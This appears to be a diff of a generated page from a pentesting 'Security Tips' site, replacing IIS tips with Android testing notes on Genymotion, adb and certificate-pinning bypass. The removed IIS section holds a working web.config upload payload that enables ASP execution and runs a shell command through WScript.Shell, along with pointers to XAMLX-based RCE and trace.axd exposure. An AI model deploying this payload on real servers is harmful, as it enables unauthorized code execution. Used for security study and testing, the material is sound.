@@ -8,14 +8,14 @@
   
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
-  <title>IIS - Security Tips</title>
+  <title>Android - Security Tips</title>
   <link rel="stylesheet" href="../css/style.css" type="text/css" />
   
   <script>
     // Current page data
-    var mkdocs_page_name = "IIS";
-    var mkdocs_page_input_path = "iis.md";
-    var mkdocs_page_url = "/iis/";
+    var mkdocs_page_name = "Android";
+    var mkdocs_page_input_path = "android.md";
+    var mkdocs_page_url = "/android/";
   </script>
   
   <script src="../js/jquery-2.1.1.min.js" defer></script>
@@ -53,9 +53,24 @@
     <a class="section-link" href="..">Home</a>
           </li>
           
-          <li class="bold">
+          <li class="bold active">
 		        
-    <a class="section-link" href="../android/">Android</a>
+    <a class="section-link" href="./">Android</a>
+    <ul>
+            
+    
+    <ul>
+    
+        <li><a class="" href="#installation">Installation</a></li>
+    
+        <li><a class="" href="#connect-with-adb">Connect with ADB</a></li>
+    
+        <li><a class="" href="#certificate-pinning">Certificate Pinning</a></li>
+    
+    </ul>
+    
+
+    </ul>
           </li>
           
           <li class="bold">
@@ -105,7 +120,7 @@
           
           <li class="bold">
 		        
-    <span class="section-link active">Web</span>
+    <span class="section-link ">Web</span>
     <ul>
                 <li class="">
                     
@@ -135,24 +150,9 @@
                     
     <a class="section-link" href="../jwt/">JWT</a>
                 </li>
-                <li class="active">
+                <li class="">
                     
-    <a class="section-link" href="./">IIS</a>
-    <ul>
-            
-    
-    <ul>
-    
-        <li><a class="" href="#bypass-blacklist-upload">Bypass blacklist upload</a></li>
-    
-        <li><a class="" href="#upload-xamlx-file-to-get-rce">Upload XAMLX file to get RCE</a></li>
-    
-        <li><a class="" href="#tracing">Tracing</a></li>
-    
-    </ul>
-    
-
-    </ul>
+    <a class="section-link" href="../iis/">IIS</a>
                 </li>
                 <li class="">
                     
@@ -232,49 +232,29 @@
         <div role="main">
           <div class="section">
             
-              <h1 id="iis">IIS</h1>
-<h2 id="bypass-blacklist-upload">Bypass blacklist upload</h2>
-<p>It's possible to bypass blacklist upload while uploading a <code>web.config</code> file.
-For this, you need to set execution rights to <code>.config</code> and then adding <code>ASP</code> code
-in the <code>web.config</code>.</p>
-<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;configuration&gt;
-   &lt;system.webServer&gt;
-      &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
-         &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;
-      &lt;/handlers&gt;
-      &lt;security&gt;
-         &lt;requestFiltering&gt;
-            &lt;fileExtensions&gt;
-               &lt;remove fileExtension=&quot;.config&quot; /&gt;
-            &lt;/fileExtensions&gt;
-            &lt;hiddenSegments&gt;
-               &lt;remove segment=&quot;web.config&quot; /&gt;
-            &lt;/hiddenSegments&gt;
-         &lt;/requestFiltering&gt;
-      &lt;/security&gt;
-   &lt;/system.webServer&gt;
-   &lt;appSettings&gt;
-&lt;/appSettings&gt;
-&lt;/configuration&gt;
-&lt;!–-
-&lt;% Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;)
-Response.write(&quot;&lt;pre&gt;&quot;)
-Set wShell1 = CreateObject(&quot;WScript.Shell&quot;)
-Set cmd1 = wShell1.Exec(&quot;whoami&quot;)
-output1 = cmd1.StdOut.Readall()
-set cmd1 = nothing: Set wShell1 = nothing
-Response.write(output1)
-Response.write(&quot;&lt;/pre&gt;&lt;!-&quot;&amp;&quot;-&quot;) %&gt;
--–&gt;
+              <h1 id="android">Android</h1>
+<h2 id="installation">Installation</h2>
+<p>Download <a href="https://www.genymotion.com/" target="_blank">GenyMotion</a> and install it. It's free for
+a personal use.
+Create a new VM, I personally use a Custom Tablet 8.0 with API 26. It's about
+300Mo to download.
+Then, you need to install the GApps. Click on the top right button "Open Gapps".</p>
+<h2 id="connect-with-adb">Connect with ADB</h2>
+<p>GenyMotion has it's own <code>adb</code>, but you can still use your own version. On Windows,
+it's located here: <code>C:\Program Files\Genymobile\Genymotion\tools</code>.</p>
+<pre><code class="language-bash">$ cd &quot;C:\Program Files\Genymobile\Genymotion\tools&quot;
+$ adb.exe devices
+$ adb.exe connect &lt;device ip&gt;
+$ adb.exe shell
+vbox86p:/ #
 </code></pre>
 
-<h2 id="upload-xamlx-file-to-get-rce">Upload XAMLX file to get RCE</h2>
-<p><a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/august/getting-shell-with-xamlx-files/" target="_blank">NCCGroup</a>
-describes how to upload a <code>XAMLX</code> file to execute code on a remote IIS server.</p>
-<h2 id="tracing">Tracing</h2>
-<p><a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/ms972204(v=msdn.10)?redirectedfrom=MSDN" target="_blank">Tracing</a>
-might be activate on the server. For example, check <code>/trace.axd</code>.</p>
+<h2 id="certificate-pinning">Certificate Pinning</h2>
+<p>On Android 7+, you need to install the burp AC on the system store. Technical details
+are explain <a href="https://blog.jeroenhd.nl/article/android-7-nougat-and-certificate-authorities" target="_blank">here</a>.</p>
+<p>Then, on the application you may need to patch some instructions. You will need
+some Android tools and patch the <code>smali</code> code. One again, technical details are
+explained <a href="https://medium.com/@felipecsl/bypassing-certificate-pinning-on-android-for-fun-and-profit-1b0d14beab2b" target="_blank">here</a>.</p>
             
           </div>
           <footer>
@@ -293,10 +273,10 @@ might be activate on the server. For example, check <code>/trace.axd</code>.</p>
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../jwt/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href=".." style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../nginx/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../aws/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
